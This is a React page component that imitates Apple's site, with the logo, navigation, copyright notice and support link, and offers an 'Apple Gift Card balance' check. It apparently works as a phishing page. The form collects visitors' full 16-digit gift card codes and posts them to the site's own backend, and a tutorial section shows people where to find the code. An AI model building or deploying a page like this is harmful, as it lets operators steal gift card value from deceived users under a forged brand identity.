import { useState, useEffect } from 'react'

export default function Home() {
  const [card, setCard] = useState('')
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState(null)
  const [error, setError] = useState(null)
  const [location, setLocation] = useState('United States')
  const [showTutorial, setShowTutorial] = useState(false)
  const [showLocationBanner, setShowLocationBanner] = useState(true)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)

  useEffect(() => {
    // 1. IP-Based Detection (Priority)
    async function detectLocation() {
      try {
        const res = await fetch('https://ipapi.co/json/')
        const data = await res.json()
        if (data.country_name) {
          setLocation(data.country_name)
          return
        }
      } catch (err) {
        console.error('IP detection failed, using fallback', err)
      }

      // 2. Timezone-based Fallback
      detectByTimezone()
    }

    function detectByTimezone() {
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || ''
      const locationMap = {
        'America/New_York': 'United States',
        'America/Chicago': 'United States',
        'America/Denver': 'United States',
        'America/Los_Angeles': 'United States',
        'Europe/London': 'United Kingdom',
        'Europe/Paris': 'France',
        'Europe/Berlin': 'Germany',
        'Asia/Tokyo': 'Japan',
        'Asia/Shanghai': 'China',
        'Asia/Hong_Kong': 'Hong Kong',
        'Australia/Sydney': 'Australia'
      }

      let detected = 'United States'
      if (tz in locationMap) detected = locationMap[tz]
      else if (tz.includes('America')) detected = 'United States'
      else if (tz.includes('Europe')) detected = 'France'
      else if (tz.includes('Asia')) detected = 'Japan'
      else if (tz.includes('Africa')) detected = 'South Africa'
      else if (tz.includes('Australia')) detected = 'Australia'

      setLocation(detected)
    }

    detectLocation()
  }, [])

  async function checkBalance(e) {
    e.preventDefault()
    setError(null)
    setResult(null)
    if (!card.trim()) return setError('Please enter a card number.')
    setLoading(true)
    try {
      const res = await fetch('/api/check-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cardNumber: card.replace(/\s+/g, '') })
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || 'Unknown error')
      setResult(data)
    } catch (err) {
      setError(err.message)
    } finally { setLoading(false) }
  }

  const countries = [
    'Afghanistan', 'Albania', 'Algeria', 'Argentina', 'Australia', 'Austria', 'Bangladesh', 'Belgium', 'Brazil',
    'Canada', 'Chile', 'China', 'Colombia', 'Czech Republic', 'Denmark', 'Egypt', 'Finland', 'France',
    'Germany', 'Greece', 'Hong Kong', 'Hungary', 'India', 'Indonesia', 'Ireland', 'Israel', 'Italy',
    'Japan', 'Malaysia', 'Mexico', 'Netherlands', 'New Zealand', 'Nigeria', 'Norway', 'Pakistan', 'Peru',
    'Philippines', 'Poland', 'Portugal', 'Romania', 'Saudi Arabia', 'Singapore', 'South Africa',
    'South Korea', 'Spain', 'Sweden', 'Switzerland', 'Taiwan', 'Thailand', 'Turkey', 'Ukraine',
    'United Arab Emirates', 'United Kingdom', 'United States', 'Vietnam'
  ].sort()

  return (
    <>
      {/* Location Banner */}
      {showLocationBanner && (
        <div className="location-banner">
          <div className="banner-content">
            <p>Choose another country or region to see content specific to your location.</p>
            <div className="banner-controls">
              <div className="select-wrapper">
                <select
                  value={location}
                  onChange={(e) => setLocation(e.target.value)}
                  className="location-select"
                >
                  {countries.map(country => (
                    <option key={country} value={country}>
                      {country === location ? `✓  ${country}` : country}
                    </option>
                  ))}
                </select>
              </div>
              <button className="banner-btn" onClick={() => setShowLocationBanner(false)}>Continue</button>
              <button className="close-banner" onClick={() => setShowLocationBanner(false)} aria-label="Close">
                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                  <path d="M18 6L6 18M6 6l12 12" />
                </svg>
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Apple Header */}
      <header className="apple-header">
        <div className="header-content">
          <div className="header-left">
            <a href="/" className="apple-logo" aria-label="Apple">
              <img src="/appleIcon.png" alt="Apple Logo" width="20" height="20" />
            </a>
          </div>

          <nav className="nav-menu">
            <a href="#store">Store</a>
            <a href="#mac">Mac</a>
            <a href="#ipad">iPad</a>
            <a href="#iphone">iPhone</a>
            <a href="#watch">Watch</a>
            <a href="#vision">Vision</a>
            <a href="#airpods">AirPods</a>
            <a href="#tv">TV & Home</a>
            <a href="#entertainment">Entertainment</a>
            <a href="#accessories">Accessories</a>
            <a href="#support">Support</a>
          </nav>

          <div className="header-actions">
            <button className="icon-btn" aria-label="Search">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="11" cy="11" r="8" /><path d="m21 21-4.3-4.3" />
              </svg>
            </button>
            <button className="icon-btn" aria-label="Shopping Bag">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z" /><path d="M3 6h18" /><path d="M16 10a4 4 0 0 1-8 0" />
              </svg>
            </button>
            <button className="mobile-menu-btn" aria-label="Menu" onClick={() => setMobileMenuOpen(true)}>
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round">
                <path d="M4 8h16M4 16h16" />
              </svg>
            </button>
          </div>
        </div>
      </header>

      {/* Mobile Full-Screen Overlay Nav */}
      <aside className={`mobile-nav ${mobileMenuOpen ? 'open' : ''}`}>
        <div className="mobile-nav-header">
          <button className="icon-btn" onClick={() => setMobileMenuOpen(false)}>
            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round">
              <path d="M18 6L6 18M6 6l12 12" />
            </svg>
          </button>
        </div>
        <nav className="mobile-links">
          <a href="#store" onClick={() => setMobileMenuOpen(false)}>Store</a>
          <a href="#mac" onClick={() => setMobileMenuOpen(false)}>Mac</a>
          <a href="#ipad" onClick={() => setMobileMenuOpen(false)}>iPad</a>
          <a href="#iphone" onClick={() => setMobileMenuOpen(false)}>iPhone</a>
          <a href="#watch" onClick={() => setMobileMenuOpen(false)}>Watch</a>
          <a href="#support" onClick={() => setMobileMenuOpen(false)}>Support</a>
        </nav>
      </aside>

      <main className="page-root">
        <div className="shell">
          {/* Hero Section */}
          <section className="hero">
            <h1>Check your Apple Gift Card balance</h1>
            <p className="hero-text">Enter the 16-digit code to see your available balance instantly.</p>
          </section>

          {/* Main Card */}
          <div className="main-card">
            <form onSubmit={checkBalance} className="form">
              <div className="input-wrapper">
                <span>Gift Card Code</span>
                <input
                  type="text"
                  value={card}
                  onChange={(e) => setCard(e.target.value.toUpperCase())}
                  placeholder="XXXX XXXX XXXX XXXX"
                  maxLength={20}
                  autoComplete="off"
                />
              </div>

              <div className="actions">
                <button type="submit" className="primary" disabled={loading}>
                  {loading ? 'Checking…' : 'Check Balance'}
                </button>
              </div>

              {error && <div className="error">{error}</div>}

              {result && (
                <div className="result">
                  <div className="amount">${result.balance.toFixed(2)}</div>
                  <div className="meta">Card ending in {result.cardLast4}</div>
                  <button type="button" className="location-btn" onClick={() => { setCard(''); setResult(null) }}>Check another card</button>
                </div>
              )}
            </form>
          </div>

          {/* Help Section */}
          <section className="help-section">
            <div className="help-header" onClick={() => setShowTutorial(!showTutorial)}>
              <h2>Can't find your gift card code?</h2>
              <button
                className="toggle-btn"
                aria-expanded={showTutorial}
                aria-label="Toggle Tutorial"
              >
                <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ transform: showTutorial ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.3s ease' }}>
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </button>
            </div>

            {showTutorial && (
              <div className="tutorial">
                <div className="mockup-grid">
                  <div className="mockup-card">
                    <div className="mockup-image">
                      <div className="card-mockup">
                        <div className="card-logo">APPLE</div>
                        <div className="card-code">1234 5678 9012 3456</div>
                      </div>
                    </div>
                    <h3>Physical Gift Card</h3>
                    <p>Look on the <strong>back</strong> of your card. The 16-digit code is usually printed below or above the barcode.</p>
                  </div>

                  <div className="mockup-card">
                    <div className="mockup-image">
                      <div className="email-mockup" style={{ width: '100%', maxWidth: '280px' }}>
                        <div className="email-header" style={{ borderBottom: '0.5px solid #eee', paddingBottom: '8px', marginBottom: '12px' }}>
                          <div style={{ fontWeight: 700, fontSize: '14px' }}>Apple</div>
                        </div>
                        <div style={{ fontSize: '13px', fontWeight: 600, marginBottom: '16px' }}>Your Apple Gift Card is ready</div>
                        <div className="code-box" style={{ background: '#f5f5f7', padding: '12px', borderRadius: '8px', fontWeight: 700, textAlign: 'center', letterSpacing: '1px' }}>1234 5678 9012 3456</div>
                      </div>
                    </div>
                    <h3>Digital Gift Card</h3>
                    <p>Check your <strong>email</strong> for a message from Apple with your gift code.</p>
                  </div>

                  <div className="mockup-card">
                    <div className="mockup-image">
                      <div className="receipt-mockup" style={{ width: '100%', maxWidth: '240px', background: 'white', border: '1px solid #d2d2d7', padding: '24px', borderRadius: '4px', boxShadow: '0 4px 12px rgba(0,0,0,0.05)' }}>
                        <div style={{ fontWeight: 700, fontSize: '11px', marginBottom: '12px' }}>Apple Store Receipt</div>
                        <div style={{ borderBottom: '1px dashed #d2d2d7', margin: '12px 0' }}></div>
                        <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '10px', marginBottom: '4px' }}>
                          <span>Card Code:</span>
                          <span style={{ fontWeight: 700 }}>1234 5678...</span>
                        </div>
                        <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '10px' }}>
                          <span>Amount:</span>
                          <span style={{ fontWeight: 700 }}>$50.00</span>
                        </div>
                      </div>
                    </div>
                    <h3>Purchase Receipt</h3>
                    <p>If purchased in-store, check your <strong>receipt</strong>. The code is printed clearly on it.</p>
                  </div>
                </div>

                <div className="help-footer">
                  <p>Still need help? <a href="https://support.apple.com/gift-card" target="_blank" rel="noopener noreferrer">Visit Apple Support →</a></p>
                </div>
              </div>
            )}
          </section>

          {/* Footer */}
          <footer className="page-footer">
            <p>© {new Date().getFullYear()} Apple Inc. All rights reserved.</p>
          </footer>
        </div>
      </main>
    </>
  )
}
